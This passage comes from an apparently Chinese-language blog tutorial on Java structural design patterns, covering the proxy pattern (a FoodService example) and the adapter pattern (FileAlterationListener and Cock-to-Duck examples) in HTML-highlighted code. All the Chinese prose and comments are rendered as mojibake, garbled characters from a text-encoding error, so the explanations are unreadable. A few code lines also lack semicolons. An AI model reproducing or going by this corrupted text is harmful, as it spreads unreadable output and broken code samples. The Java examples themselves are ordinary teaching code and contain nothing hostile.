æ›´ä¼˜ç¾ï¼›åŸå‹æ¨¡å¼ç”¨å¾—æœ€å°‘ï¼Œäº†è§£å’Œ Object ç±»ä¸­çš„ clone() æ–¹æ³•ç›¸å…³çš„çŸ¥è¯†å³å¯ã€‚</p><h2><span id="ç»“æ„å‹æ¨¡å¼">ç»“æ„å‹æ¨¡å¼</span></h2><p>å‰é¢åˆ›å»ºå‹æ¨¡å¼ä»‹ç»äº†åˆ›å»ºå¯¹è±¡çš„ä¸€äº›è®¾è®¡æ¨¡å¼ï¼Œè¿™èŠ‚ä»‹ç»çš„ç»“æ„å‹æ¨¡å¼æ—¨åœ¨é€šè¿‡æ”¹å˜ä»£ç ç»“æ„æ¥è¾¾åˆ°è§£è€¦çš„ç›®çš„ï¼Œä½¿å¾—æˆ‘ä»¬çš„ä»£ç å®¹æ˜“ç»´æŠ¤å’Œæ‰©å±•ã€‚</p><h3><span id="ä»£ç†æ¨¡å¼">ä»£ç†æ¨¡å¼</span></h3><p>ç¬¬ä¸€ä¸ªè¦ä»‹ç»çš„ä»£ç†æ¨¡å¼æ˜¯æœ€å¸¸ä½¿ç”¨çš„æ¨¡å¼ä¹‹ä¸€äº†ï¼Œç”¨ä¸€ä¸ªä»£ç†æ¥éšè—å…·ä½“å®ç°ç±»çš„å®ç°ç»†èŠ‚ï¼Œé€šå¸¸è¿˜ç”¨äºåœ¨çœŸå®çš„å®ç°çš„å‰åæ·»åŠ ä¸€éƒ¨åˆ†é€»è¾‘ã€‚</p><p>æ—¢ç„¶è¯´æ˜¯<strong>ä»£ç†</strong>ï¼Œé‚£å°±è¦å¯¹å®¢æˆ·ç«¯éšè—çœŸå®å®ç°ï¼Œç”±ä»£ç†æ¥è´Ÿè´£å®¢æˆ·ç«¯çš„æ‰€æœ‰è¯·æ±‚ã€‚å½“ç„¶ï¼Œä»£ç†åªæ˜¯ä¸ªä»£ç†ï¼Œå®ƒä¸ä¼šå®Œæˆå®é™…çš„ä¸šåŠ¡é€»è¾‘ï¼Œè€Œæ˜¯ä¸€å±‚çš®è€Œå·²ï¼Œä½†æ˜¯å¯¹äºå®¢æˆ·ç«¯æ¥è¯´ï¼Œå®ƒå¿…é¡»è¡¨ç°å¾—å°±æ˜¯å®¢æˆ·ç«¯éœ€è¦çš„çœŸå®å®ç°ã€‚</p><blockquote><p>ç†è§£<strong>ä»£ç†</strong>è¿™ä¸ªè¯ï¼Œè¿™ä¸ªæ¨¡å¼å…¶å®å°±ç®€å•äº†ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FoodService</span> &#123;</span><br><span class="line">    Food <span class="title function_">makeChicken</span><span class="params">()</span>;</span><br><span class="line">    Food <span class="title function_">makeNoodle</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FoodServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">FoodService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeChicken</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">Food</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Chicken</span>()</span><br><span class="line">        f.setChicken(<span class="string">&quot;1kg&quot;</span>);</span><br><span class="line">      f.setSpicy(<span class="string">&quot;1g&quot;</span>);</span><br><span class="line">      f.setSalt(<span class="string">&quot;3g&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeNoodle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Food</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Noodle</span>();</span><br><span class="line">        f.setNoodle(<span class="string">&quot;500g&quot;</span>);</span><br><span class="line">        f.setSalt(<span class="string">&quot;5g&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> f;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»£ç†è¦è¡¨ç°å¾—â€œå°±åƒæ˜¯â€çœŸå®å®ç°ç±»ï¼Œæ‰€ä»¥éœ€è¦å®ç° FoodService</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FoodServiceProxy</span> <span class="keyword">implements</span> <span class="title class_">FoodService</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å†…éƒ¨ä¸€å®šè¦æœ‰ä¸€ä¸ªçœŸå®çš„å®ç°ç±»ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•æ³¨å…¥</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">FoodService</span> <span class="variable">foodService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FoodServiceImpl</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeChicken</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘ä»¬é©¬ä¸Šè¦å¼€å§‹åˆ¶ä½œé¸¡è‚‰äº†&quot;</span>);</span><br><span class="line">      </span><br><span class="line">        <span class="comment">// å¦‚æœæˆ‘ä»¬å®šä¹‰è¿™å¥ä¸ºæ ¸å¿ƒä»£ç çš„è¯ï¼Œé‚£ä¹ˆï¼Œæ ¸å¿ƒä»£ç æ˜¯çœŸå®å®ç°ç±»åšçš„ï¼Œ</span></span><br><span class="line">        <span class="comment">// ä»£ç†åªæ˜¯åœ¨æ ¸å¿ƒä»£ç å‰ååšäº›â€œæ— è¶³è½»é‡â€çš„äº‹æƒ…</span></span><br><span class="line">        <span class="type">Food</span> <span class="variable">food</span> <span class="operator">=</span> foodService.makeChicken();</span><br><span class="line">      </span><br><span class="line">        System.out.println(<span class="string">&quot;é¸¡è‚‰åˆ¶ä½œå®Œæˆå•¦ï¼ŒåŠ ç‚¹èƒ¡æ¤’ç²‰&quot;</span>); <span class="comment">// å¢å¼º</span></span><br><span class="line">      food.addCondiment(<span class="string">&quot;pepper&quot;</span>);</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">return</span> food;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeNoodle</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å‡†å¤‡åˆ¶ä½œæ‹‰é¢~&quot;</span>);</span><br><span class="line">        <span class="type">Food</span> <span class="variable">food</span> <span class="operator">=</span> foodService.makeNoodle();</span><br><span class="line">        System.out.println(<span class="string">&quot;åˆ¶ä½œå®Œæˆå•¦&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è°ƒç”¨ï¼Œæ³¨æ„ï¼Œæˆ‘ä»¬è¦ç”¨ä»£ç†æ¥å®ä¾‹åŒ–æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™é‡Œç”¨ä»£ç†ç±»æ¥å®ä¾‹åŒ–</span></span><br><span class="line"><span class="type">FoodService</span> <span class="variable">foodService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FoodServiceProxy</span>();</span><br><span class="line">foodService.makeChicken();</span><br></pre></td></tr></table></figure><p><img src="https://www.javadoop.com/blogimages/design-pattern/proxy-1.png" alt="proxy"></p><p>æˆ‘ä»¬å‘ç°æ²¡æœ‰ï¼Œä»£ç†æ¨¡å¼è¯´ç™½äº†å°±æ˜¯åš <strong>â€œæ–¹æ³•åŒ…è£…â€</strong> æˆ–åš <strong>â€œæ–¹æ³•å¢å¼ºâ€</strong>ã€‚åœ¨é¢å‘åˆ‡é¢ç¼–ç¨‹ä¸­ï¼Œå…¶å®å°±æ˜¯åŠ¨æ€ä»£ç†çš„è¿‡ç¨‹ã€‚æ¯”å¦‚ Spring ä¸­ï¼Œæˆ‘ä»¬è‡ªå·±ä¸å®šä¹‰ä»£ç†ç±»ï¼Œä½†æ˜¯ Spring ä¼šå¸®æˆ‘ä»¬åŠ¨æ€æ¥å®šä¹‰ä»£ç†ï¼Œç„¶åæŠŠæˆ‘ä»¬å®šä¹‰åœ¨ @Beforeã€@Afterã€@Around ä¸­çš„ä»£ç é€»è¾‘åŠ¨æ€æ·»åŠ åˆ°ä»£ç†ä¸­ã€‚</p><p>è¯´åˆ°åŠ¨æ€ä»£ç†ï¼Œåˆå¯ä»¥å±•å¼€è¯´ï¼ŒSpring ä¸­å®ç°åŠ¨æ€ä»£ç†æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å¦‚æœæˆ‘ä»¬çš„ç±»å®šä¹‰äº†æ¥å£ï¼Œå¦‚ UserService æ¥å£å’Œ UserServiceImpl å®ç°ï¼Œé‚£ä¹ˆé‡‡ç”¨ JDK çš„åŠ¨æ€ä»£ç†ï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥å»çœ‹çœ‹ java.lang.reflect.Proxy ç±»çš„æºç ï¼›å¦ä¸€ç§æ˜¯æˆ‘ä»¬è‡ªå·±æ²¡æœ‰å®šä¹‰æ¥å£çš„ï¼ŒSpring ä¼šé‡‡ç”¨ CGLIB è¿›è¡ŒåŠ¨æ€ä»£ç†ï¼Œå®ƒæ˜¯ä¸€ä¸ª jar åŒ…ï¼Œæ€§èƒ½è¿˜ä¸é”™ã€‚</p><h3><span id="é€‚é…å™¨æ¨¡å¼">é€‚é…å™¨æ¨¡å¼</span></h3><p>è¯´å®Œä»£ç†æ¨¡å¼ï¼Œè¯´é€‚é…å™¨æ¨¡å¼ï¼Œæ˜¯å› ä¸ºå®ƒä»¬å¾ˆç›¸ä¼¼ï¼Œè¿™é‡Œå¯ä»¥åšä¸ªæ¯”è¾ƒã€‚</p><p>é€‚é…å™¨æ¨¡å¼åšçš„å°±æ˜¯ï¼Œæœ‰ä¸€ä¸ªæ¥å£éœ€è¦å®ç°ï¼Œä½†æ˜¯æˆ‘ä»¬ç°æˆçš„å¯¹è±¡éƒ½ä¸æ»¡è¶³ï¼Œéœ€è¦åŠ ä¸€å±‚é€‚é…å™¨æ¥è¿›è¡Œé€‚é…ã€‚</p><p>é€‚é…å™¨æ¨¡å¼æ€»ä½“æ¥è¯´åˆ†ä¸‰ç§ï¼šé»˜è®¤é€‚é…å™¨æ¨¡å¼ã€å¯¹è±¡é€‚é…å™¨æ¨¡å¼ã€ç±»é€‚é…å™¨æ¨¡å¼ã€‚å…ˆä¸æ€¥ç€åˆ†æ¸…æ¥šè¿™å‡ ä¸ªï¼Œå…ˆçœ‹çœ‹ä¾‹å­å†è¯´ã€‚</p><h4><span id="é»˜è®¤é€‚é…å™¨æ¨¡å¼">é»˜è®¤é€‚é…å™¨æ¨¡å¼</span></h4><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹æœ€ç®€å•çš„é€‚é…å™¨æ¨¡å¼**é»˜è®¤é€‚é…å™¨æ¨¡å¼(Default Adapter)**æ˜¯æ€ä¹ˆæ ·çš„ã€‚</p><p>æˆ‘ä»¬ç”¨ Appache commons-io åŒ…ä¸­çš„ FileAlterationListener åšä¾‹å­ï¼Œæ­¤æ¥å£å®šä¹‰äº†å¾ˆå¤šçš„æ–¹æ³•ï¼Œç”¨äºå¯¹æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹è¿›è¡Œç›‘æ§ï¼Œä¸€æ—¦å‘ç”Ÿäº†å¯¹åº”çš„æ“ä½œï¼Œå°±ä¼šè§¦å‘ç›¸åº”çš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FileAlterationListener</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">(<span class="keyword">final</span> FileAlterationObserver observer)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onDirectoryCreate</span><span class="params">(<span class="keyword">final</span> File directory)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onDirectoryChange</span><span class="params">(<span class="keyword">final</span> File directory)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onDirectoryDelete</span><span class="params">(<span class="keyword">final</span> File directory)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onFileCreate</span><span class="params">(<span class="keyword">final</span> File file)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onFileChange</span><span class="params">(<span class="keyword">final</span> File file)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onFileDelete</span><span class="params">(<span class="keyword">final</span> File file)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onStop</span><span class="params">(<span class="keyword">final</span> FileAlterationObserver observer)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ¥å£çš„ä¸€å¤§é—®é¢˜æ˜¯æŠ½è±¡æ–¹æ³•å¤ªå¤šäº†ï¼Œå¦‚æœæˆ‘ä»¬è¦ç”¨è¿™ä¸ªæ¥å£ï¼Œæ„å‘³ç€æˆ‘ä»¬è¦å®ç°æ¯ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬åªæ˜¯æƒ³è¦ç›‘æ§æ–‡ä»¶å¤¹ä¸­çš„<strong>æ–‡ä»¶åˆ›å»º</strong>å’Œ<strong>æ–‡ä»¶åˆ é™¤</strong>äº‹ä»¶ï¼Œå¯æ˜¯æˆ‘ä»¬è¿˜æ˜¯ä¸å¾—ä¸å®ç°æ‰€æœ‰çš„æ–¹æ³•ï¼Œå¾ˆæ˜æ˜¾ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸‹é¢çš„ä¸€ä¸ª<strong>é€‚é…å™¨</strong>ï¼Œå®ƒç”¨äºå®ç°ä¸Šé¢çš„æ¥å£ï¼Œä½†æ˜¯<strong>æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯ç©ºæ–¹æ³•</strong>ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½¬è€Œå®šä¹‰è‡ªå·±çš„ç±»æ¥ç»§æ‰¿ä¸‹é¢è¿™ä¸ªç±»å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileAlterationListenerAdaptor</span> <span class="keyword">implements</span> <span class="title class_">FileAlterationListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">(<span class="keyword">final</span> FileAlterationObserver observer)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDirectoryCreate</span><span class="params">(<span class="keyword">final</span> File directory)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDirectoryChange</span><span class="params">(<span class="keyword">final</span> File directory)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDirectoryDelete</span><span class="params">(<span class="keyword">final</span> File directory)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFileCreate</span><span class="params">(<span class="keyword">final</span> File file)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFileChange</span><span class="params">(<span class="keyword">final</span> File file)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFileDelete</span><span class="params">(<span class="keyword">final</span> File file)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStop</span><span class="params">(<span class="keyword">final</span> FileAlterationObserver observer)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å®šä¹‰ä»¥ä¸‹ç±»ï¼Œæˆ‘ä»¬ä»…ä»…éœ€è¦å®ç°æˆ‘ä»¬æƒ³å®ç°çš„æ–¹æ³•å°±å¯ä»¥äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileMonitor</span> <span class="keyword">extends</span> <span class="title class_">FileAlterationListenerAdaptor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFileCreate</span><span class="params">(<span class="keyword">final</span> File file)</span> &#123;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶åˆ›å»º</span></span><br><span class="line">        doSomething();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFileDelete</span><span class="params">(<span class="keyword">final</span> File file)</span> &#123;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶åˆ é™¤</span></span><br><span class="line">        doSomething();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œä¸Šé¢è¯´çš„åªæ˜¯é€‚é…å™¨æ¨¡å¼çš„å…¶ä¸­ä¸€ç§ï¼Œä¹Ÿæ˜¯æœ€ç®€å•çš„ä¸€ç§ï¼Œæ— éœ€å¤šè¨€ã€‚ä¸‹é¢ï¼Œå†ä»‹ç»<strong>â€œæ­£ç»Ÿçš„â€</strong>é€‚é…å™¨æ¨¡å¼ã€‚</p><h4><span id="å¯¹è±¡é€‚é…å™¨æ¨¡å¼">å¯¹è±¡é€‚é…å™¨æ¨¡å¼</span></h4><p>æ¥çœ‹ä¸€ä¸ªã€ŠHead First è®¾è®¡æ¨¡å¼ã€‹ä¸­çš„ä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ç¨å¾®ä¿®æ”¹äº†ä¸€ä¸‹ï¼Œçœ‹çœ‹æ€ä¹ˆå°†é¸¡é€‚é…æˆé¸­ï¼Œè¿™æ ·é¸¡ä¹Ÿèƒ½å½“é¸­æ¥ç”¨ã€‚å› ä¸ºï¼Œç°åœ¨é¸­è¿™ä¸ªæ¥å£ï¼Œæˆ‘ä»¬æ²¡æœ‰åˆé€‚çš„å®ç°ç±»å¯ä»¥ç”¨ï¼Œæ‰€ä»¥éœ€è¦é€‚é…å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Duck</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quack</span><span class="params">()</span>; <span class="comment">// é¸­çš„å‘±å‘±å«</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span>; <span class="comment">// é£</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Cock</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">gobble</span><span class="params">()</span>; <span class="comment">// é¸¡çš„å’•å’•å«</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span>; <span class="comment">// é£</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WildCock</span> <span class="keyword">implements</span> <span class="title class_">Cock</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">gobble</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å’•å’•å«&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é¸¡ä¹Ÿä¼šé£å“¦&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¸­æ¥å£æœ‰ fly() å’Œ quare() ä¸¤ä¸ªæ–¹æ³•ï¼Œé¸¡ Cock å¦‚æœè¦å†’å……é¸­ï¼Œfly() æ–¹æ³•æ˜¯ç°æˆçš„ï¼Œä½†æ˜¯é¸¡ä¸ä¼šé¸­çš„å‘±å‘±å«ï¼Œæ²¡æœ‰ quack() æ–¹æ³•ã€‚è¿™ä¸ªæ—¶å€™å°±éœ€è¦é€‚é…äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¯«æ— ç–‘é—®ï¼Œé¦–å…ˆï¼Œè¿™ä¸ªé€‚é…å™¨è‚¯å®šéœ€è¦ implements Duckï¼Œè¿™æ ·æ‰èƒ½å½“åšé¸­æ¥ç”¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CockAdapter</span> <span class="keyword">implements</span> <span class="title class_">Duck</span> &#123;</span><br><span class="line">  </span><br><span class="line">    Cock cock;</span><br><span class="line">    <span class="comment">// æ„é€ æ–¹æ³•ä¸­éœ€è¦ä¸€ä¸ªé¸¡çš„å®ä¾‹ï¼Œæ­¤ç±»å°±æ˜¯å°†è¿™åªé¸¡é€‚é…æˆé¸­æ¥ç”¨</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">CockAdapter</span><span class="params">(Cock cock)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cock = cock;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å®ç°é¸­çš„å‘±å‘±å«æ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quack</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// å†…éƒ¨å…¶å®æ˜¯ä¸€åªé¸¡çš„å’•å’•å«</span></span><br><span class="line">        cock.gobble();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span> &#123;</span><br><span class="line">        cock.fly();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è°ƒç”¨å¾ˆç®€å•äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// æœ‰ä¸€åªé‡é¸¡</span></span><br><span class="line">  <span class="type">Cock</span> <span class="variable">wildCock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WildCock</span>();</span><br><span class="line">  <span class="comment">// æˆåŠŸå°†é‡é¸¡é€‚é…æˆé¸­</span></span><br><span class="line">  <span class="type">Duck</span> <span class="variable">duck</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CockAdapter</span>(wildCock);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œï¼Œå¤§å®¶ä¹Ÿå°±çŸ¥é“äº†é€‚é…å™¨æ¨¡å¼æ˜¯æ€ä¹ˆå›äº‹äº†ã€‚æ— éæ˜¯æˆ‘ä»¬éœ€è¦ä¸€åªé¸­ï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰ä¸€åªé¸¡ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å®šä¹‰ä¸€ä¸ªé€‚é…å™¨ï¼Œç”±è¿™ä¸ªé€‚é…å™¨æ¥å……å½“é¸­ï¼Œä½†æ˜¯é€‚é…å™¨é‡Œé¢çš„æ–¹æ³•è¿˜æ˜¯ç”±é¸¡æ¥å®ç°çš„ã€‚</p><p>æˆ‘ä»¬ç”¨ä¸€ä¸ªå›¾æ¥ç®€å•è¯´æ˜ä¸‹ï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/adapter-1.png" alt="adapter-1"></p><p>ä¸Šå›¾åº”è¯¥è¿˜æ˜¯å¾ˆå®¹æ˜“ç†è§£çš„ï¼Œæˆ‘å°±ä¸åšæ›´å¤šçš„è§£é‡Šäº†ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬çœ‹çœ‹ç±»é€‚é…æ¨¡å¼æ€ä¹ˆæ ·çš„ã€‚</p><h4><span id="ç±»é€‚é…å™¨æ¨¡å¼">ç±»é€‚é…å™¨æ¨¡å¼</span></h4><p>åºŸè¯å°‘è¯´ï¼Œç›´æ¥ä¸Šå›¾ï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/adapter-2.png" alt="adapter-1"></p><p>çœ‹åˆ°è¿™ä¸ªå›¾ï¼Œå¤§å®¶åº”è¯¥å¾ˆå®¹æ˜“ç†è§£çš„å§ï¼Œé€šè¿‡ç»§æ‰¿çš„æ–¹æ³•ï¼Œé€‚é…å™¨è‡ªåŠ¨è·å¾—äº†æ‰€éœ€è¦çš„å¤§éƒ¨åˆ†æ–¹æ³•ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨æ›´åŠ ç®€å•ï¼Œç›´æ¥ <code>Target t = new SomeAdapter();</code> å°±å¯ä»¥äº†ã€‚</p><h4><span 